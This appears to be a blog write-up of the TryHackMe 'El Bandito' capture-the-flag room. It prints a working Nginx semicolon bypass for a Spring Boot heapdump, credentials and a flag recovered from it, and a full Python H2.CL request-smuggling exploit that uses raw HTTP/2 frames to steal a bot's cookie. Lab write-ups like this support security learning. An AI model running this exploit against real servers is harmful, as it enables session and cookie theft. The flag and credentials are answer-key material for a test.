---
title: "TryHackMe El Bandito: H2.CL desync to steal bot credentials"
date: 2026-10-23T10:13:00+05:30
lastmod: 2026-10-23T10:13:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-elbandito/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - HTTP request smuggling
  - H2.CL desync
  - HTTP/2
  - Spring Boot
  - heapdump
  - request smuggling
  - web application pentesting
  - HTTP Request Smuggling

draft: false
description: "TryHackMe El Bandito walkthrough: Spring Boot heapdump extraction and H2.CL desync via raw HTTP/2 frames to capture the bot's flag cookie."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|El Bandito |![El Bandito room icon](https://cdn-images.tryhackme.com/room-icons/a183d2d10f868ab17143370c5834086e.svg)|

This hard-difficulty room in the Web Application Pentesting path is a challenge box with no guided tasks, just two flags to find. It sits in the HTTP Request Smuggling module alongside the [HTTP Request Smuggling walkthrough](/post/thm-room-httprequestsmuggling/), the [HTTP/2 Request Smuggling walkthrough](/post/thm-room-http2requestsmuggling/), the [WebSocket Request Smuggling walkthrough](/post/thm-room-wsrequestsmuggling/), and the [HTTP Browser Desync walkthrough](/post/thm-room-requestsmugglingbrowserdesync/). The target runs HTTP/2 over TLS on port 80 (behind "El Bandito Server") and a Spring Boot application on port 8080 behind Nginx. The first flag is in a Java heapdump, and the second requires an H2.CL request smuggling exploit to capture a bot's cookie.

## Task 1: Find the flags

The room deploys a single VM with two services:

- **Port 80**: HTTP/2 over TLS, serving a Flask chat application behind a custom proxy ("El Bandito Server"). The chat app at `/messages` loads `messages.js`, which fetches messages from `/getMessages` and renders them via `innerHTML`. Login is at `/access` and `/login`.
- **Port 8080**: Spring Boot behind Nginx. The Spring Boot app exposes actuator endpoints, but Nginx blocks paths starting with `/admin`.

### Reconnaissance

An nmap scan reveals ports 22 (SSH), 80 (ssl/http), 631 (CUPS), and 8080 (http-proxy). Port 80 negotiates HTTP/2 via ALPN and presents "El Bandito Server" in the response headers. Port 8080 serves an Nginx proxy to a Spring Boot backend.

```
  # nmap -sC -sV TARGET
  PORT     STATE SERVICE  VERSION
  22/tcp   open  ssh      OpenSSH 8.2p1
  80/tcp   open  ssl/http El Bandito Server
  631/tcp  open  ipp      CUPS
  8080/tcp open  http     nginx/1.18.0
```

### Flag 1: Spring Boot heapdump

Spring Boot actuator endpoints are blocked by Nginx's path filter, but the semicolon path normalization bypass works: `/;/heapdump` passes through Nginx (which strips the path prefix before the semicolon) and reaches the Spring Boot actuator. The heapdump file is ~10 MB and contains Java heap memory, including hardcoded secrets and flag values.

```
  # curl -s http://TARGET:8080/;/heapdump -o heapdump.hprof
  # strings heapdump.hprof | grep -oP 'THM\{[^}]+\}'
```

The heapdump also reveals the internal endpoint mappings (`/admin-creds`, `/admin-flag`, `/isOnline`, `/token`), and the login credentials for the chat application: username `hAckLIEN` and password `YouCanCatchUsInYourDreams404`. Two virtual hosts are visible in the heap: `bandito.public.thm` (the Flask chat app) and `bandito.websocket.thm`.

**What's the first web flag?** **THM{:::MY_DECLINATION:+62\*_14'_31.4'':::}**

{{< ad >}}

### Flag 2: H2.CL desync to capture the bot's cookie

The second flag requires exploiting an HTTP/2 Content-Length desync (H2.CL) on port 80. The proxy trusts the `content-length` header in the HTTP/2 HEADERS frame to determine where the request body ends, but forwards all bytes from the HTTP/2 DATA frame to the Flask backend. When the DATA frame is larger than the declared Content-Length, the overflow bytes persist in the backend's connection buffer and are interpreted as the start of the next HTTP request.

A HeadlessChrome bot periodically sends `GET /access` to `bandito.public.thm:80`. This request carries a cookie containing the flag: `Cookie: flag=THM{...}`. The goal is to plant a smuggled `POST /send_message` with a large Content-Length that captures the bot's entire request (including its Cookie header) as a chat message.

#### Why raw H2 frames are necessary

Python's `h2` library validates that the DATA frame size matches the declared Content-Length, which prevents the mismatch needed for the exploit. The solution is to construct HTTP/2 frames manually using `hpack` for header encoding and `struct.pack` for frame headers. This bypasses the library's validation and lets us send a DATA frame larger than the claimed Content-Length.

#### The exploit

```python
  #!/usr/bin/env python3
  import socket, ssl, struct
  from hpack import Encoder

  TARGET = "TARGET_IP"
  PORT = 80
  SESSION = "<session_cookie_from_login>"

  def make_frame(ft, flags, sid, payload):
      return (struct.pack('!I', len(payload))[1:]
              + struct.pack('!BB', ft, flags)
              + struct.pack('!I', sid & 0x7FFFFFFF)
              + payload)

  smuggled = (
      "POST /send_message HTTP/1.1\r\n"
      "Host: bandito.public.thm\r\n"
      "Content-Type: application/x-www-form-urlencoded\r\n"
      "Content-Length: 700\r\n"
      f"Cookie: session={SESSION}\r\n"
      "\r\n"
      "data="
  )
  legit_body = "data=test"
  full_body = legit_body + smuggled
  claimed_cl = str(len(legit_body))

  ctx = ssl.create_default_context()
  ctx.check_hostname = False
  ctx.verify_mode = ssl.CERT_NONE
  ctx.set_alpn_protocols(['h2'])
  raw = socket.create_connection((TARGET, PORT), timeout=15)
  sock = ctx.wrap_socket(raw, server_hostname=TARGET)

  # H2 connection preface and settings
  sock.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
  sock.sendall(make_frame(0x04, 0, 0, b''))
  sock.sendall(make_frame(0x08, 0, 0, struct.pack('!I', 1048576)))

  # Encode H2 headers with the FALSE content-length
  enc = Encoder()
  hdrs = enc.encode([
      (':method', 'POST'),
      (':path', '/send_message'),
      (':authority', 'bandito.public.thm'),
      (':scheme', 'https'),
      ('content-type', 'application/x-www-form-urlencoded'),
      ('content-length', claimed_cl),
      ('cookie', f'session={SESSION}'),
  ])

  # HEADERS (END_HEADERS, no END_STREAM)
  sock.sendall(make_frame(0x01, 0x04, 1, hdrs))
  # DATA (END_STREAM) with full body including smuggled portion
  sock.sendall(make_frame(0x00, 0x01, 1, full_body.encode()))
```

The key parameters:

- **`claimed_cl = 9`** (length of `data=test`): the proxy reads only 9 bytes from the DATA frame as the request body.
- **`Content-Length: 700`** on the smuggled POST: the backend waits for 700 bytes of body after `data=`. The bot's `GET /access` request arrives on the same backend connection and is consumed as part of that 700-byte body, including its full headers and cookie.

The 700-byte Content-Length is critical. The bot's request is approximately 500-600 bytes including all headers. An earlier attempt with Content-Length 500 captured the request line and most headers but cut off before the Cookie header. Increasing to 700 captures the entire request.

#### Retrieving the flag

After waiting ~10 seconds for the bot to hit the poisoned connection, the captured request appears in `/getMessages` as a message from JACK:

```
  # curl -sk https://TARGET:80/getMessages -H 'Host: bandito.public.thm' \
    -b 'session=SESSION_COOKIE'
  {"JACK":["...previous messages...",
  "GET /access HTTP/1.1\r\nhost: bandito.public.thm:80\r\n...
  \r\ncookie: flag=THM{REDACTED}\r\nX-Forwa"],"OLIVER":[]}
```

The bot's `Cookie: flag=THM{...}` header is visible in the captured request body. The flag contains inverted exclamation marks (Unicode `¡`), which the JSON response encodes as escape sequences. Decode them before submission.

**What's the second web flag?** **THM{REDACTED}**

## Takeaways

**The Content-Length on the smuggled request controls how much of the victim's request you capture, and getting it wrong looks like a clean miss.** With Content-Length 500, the exploit captured the bot's request line and most headers but stopped before the Cookie header. The output showed a valid-looking HeadlessChrome request with "no cookies," which appeared to be a bot that simply did not carry a cookie. The actual problem was that HTTP headers are serialized in a fixed order, and the Cookie header came after Accept-Encoding and Accept-Language, at approximately byte 450 of the request. Increasing Content-Length to 700 captured the full request including the cookie. This is a common trap in request smuggling: a partially successful capture can produce output that looks complete but is missing the one header you need. When the captured request looks clean but lacks the expected data, increase the Content-Length before concluding the data is not there.

**HTTP/2 library validation is a feature, not a bug, and bypassing it is the exploit.** Python's `h2` library enforces RFC 7540 by checking that DATA frame sizes match the declared Content-Length. This is correct behavior that prevents exactly the kind of desync this room exploits. The proxy, which also validates Content-Length against the H2 frame, should reject the mismatch, but instead trusts the Content-Length header and forwards the excess bytes to the backend. Building raw H2 frames with `hpack` and `struct.pack` bypasses the client-side validation, letting the attacker send a well-formed H2 connection that carries a semantically invalid request. The lesson: when a library prevents you from doing something, check whether the target's validation matches the library's. If the target is weaker, constructing the protocol manually is the path.

Room solved 100%: 1 task, 2 answers.
